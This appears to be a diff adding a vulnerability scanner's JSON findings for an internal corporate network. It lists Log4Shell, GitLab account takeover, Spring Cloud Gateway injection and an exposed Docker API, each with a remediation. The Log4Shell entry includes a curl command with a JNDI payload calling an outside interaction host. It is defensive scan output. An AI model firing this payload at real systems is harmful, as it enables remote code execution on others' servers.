@@ -1,0 +1,102 @@
+[
+  {
+    "template-id": "cve-2021-44228-log4j",
+    "info": {
+      "name": "Apache Log4j Remote Code Execution (Log4Shell)",
+      "author": ["projectdiscovery"],
+      "tags": ["cve", "cve2021", "rce", "oast", "log4j"],
+      "description": "Apache Log4j2 versions 2.0-beta9 through 2.15.0 JNDI features do not protect against attacker controlled LDAP and other JNDI related endpoints, allowing unauthenticated remote code execution.",
+      "reference": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+        "https://logging.apache.org/log4j/2.x/security.html"
+      ],
+      "severity": "critical",
+      "classification": {
+        "cvss-score": 10.0,
+        "cve-id": "CVE-2021-44228",
+        "cwe-id": ["CWE-502", "CWE-400"]
+      },
+      "remediation": "Upgrade to Apache Log4j 2.17.1 or higher. Alternatively set formatMsgNoLookups=true or remove JndiLookup class from classpath."
+    },
+    "type": "http",
+    "host": "https://auth-api.corp.internal:8443",
+    "matched-at": "https://auth-api.corp.internal:8443/oauth/token",
+    "ip": "10.10.30.12",
+    "timestamp": "2026-10-28T09:15:30.123456Z",
+    "curl-command": "curl -X 'POST' -d 'user=${jndi:ldap://interact.sh/a}' 'https://auth-api.corp.internal:8443/oauth/token'"
+  },
+  {
+    "template-id": "cve-2023-7028-gitlab-ato",
+    "info": {
+      "name": "GitLab CE/EE Account Takeover via Password Reset",
+      "author": ["projectdiscovery"],
+      "tags": ["cve", "cve2023", "gitlab", "ato", "critical"],
+      "description": "GitLab CE/EE versions 16.1 through 16.7 allows account takeover by requesting a password reset email to be delivered to an unverified email address.",
+      "reference": [
+        "https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/",
+        "https://nvd.nist.gov/vuln/detail/CVE-2023-7028"
+      ],
+      "severity": "critical",
+      "classification": {
+        "cvss-score": 10.0,
+        "cve-id": "CVE-2023-7028",
+        "cwe-id": ["CWE-640"]
+      },
+      "remediation": "Upgrade GitLab instance to versions 16.5.6, 16.6.4, 16.7.2 or above immediately."
+    },
+    "type": "http",
+    "host": "https://git.corp.internal",
+    "matched-at": "https://git.corp.internal/users/password",
+    "ip": "10.10.30.25",
+    "timestamp": "2026-10-28T09:16:12.789123Z"
+  },
+  {
+    "template-id": "cve-2022-22947-spring-cloud",
+    "info": {
+      "name": "Spring Cloud Gateway Code Injection",
+      "author": ["projectdiscovery"],
+      "tags": ["cve", "cve2022", "spring", "rce", "gateway"],
+      "description": "Applications using Spring Cloud Gateway are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured.",
+      "reference": [
+        "https://tanzu.vmware.com/security/cve-2022-22947",
+        "https://nvd.nist.gov/vuln/detail/CVE-2022-22947"
+      ],
+      "severity": "high",
+      "classification": {
+        "cvss-score": 8.8,
+        "cve-id": "CVE-2022-22947",
+        "cwe-id": ["CWE-94"]
+      },
+      "remediation": "Disable the gateway actuator endpoint: management.endpoint.gateway.enabled=false, or upgrade Spring Cloud Gateway to 3.1.1+."
+    },
+    "type": "http",
+    "host": "https://edge-proxy.corp.internal:8080",
+    "matched-at": "https://edge-proxy.corp.internal:8080/actuator/gateway/routes",
+    "ip": "10.10.30.40",
+    "timestamp": "2026-10-28T09:16:45.345678Z"
+  },
+  {
+    "template-id": "docker-unauth-api",
+    "info": {
+      "name": "Unauthenticated Docker Engine Daemon API Exposure",
+      "author": ["projectdiscovery"],
+      "tags": ["misconfig", "docker", "api", "unauth"],
+      "description": "Docker Daemon API is exposed to the network without TLS mutual authentication, permitting unauthenticated container creation and root host compromise.",
+      "reference": [
+        "https://docs.docker.com/engine/security/protect-access/"
+      ],
+      "severity": "high",
+      "classification": {
+        "cvss-score": 8.5,
+        "cve-id": "N/A",
+        "cwe-id": ["CWE-306"]
+      },
+      "remediation": "Do not bind Docker daemon TCP socket to 0.0.0.0. Require client certificate TLS authentication via --tlsverify."
+    },
+    "type": "http",
+    "host": "http://ci-runner.corp.internal:2375",
+    "matched-at": "http://ci-runner.corp.internal:2375/version",
+    "ip": "10.10.30.80",
+    "timestamp": "2026-10-28T09:17:02.991200Z"
+  }
+]
